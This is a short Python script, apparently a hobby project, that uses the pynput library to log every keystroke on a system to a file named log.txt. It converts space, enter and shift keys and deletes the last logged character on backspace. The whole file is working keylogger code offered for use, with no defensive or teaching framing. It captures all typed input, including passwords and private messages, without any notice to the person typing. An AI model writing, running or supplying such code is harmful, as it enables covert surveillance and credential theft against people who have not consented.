"""
Here you have to install pynput on your system
In this file i handle only space enter shift and backspace
You can do a lot more .

Author : Debashis Gupta
"""
import os
from pynput.keyboard import Listener


def pylogger_File(key):
    flag=False
    letter = str(key)
    letter = letter.replace("'", "")
    # print(letter)
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.backspace':
        letter = '<BACKSPACE>'
        flag=True
    with open("log.txt", 'a') as f:

        if flag == True:
            try:
                f.seek(f.tell()-1,os.SEEK_SET)
                f.truncate()
            except Exception as e:
                print(e)
        elif flag == False:
            f.write(letter)


with Listener(on_press=pylogger_File) as l:
    l.join()
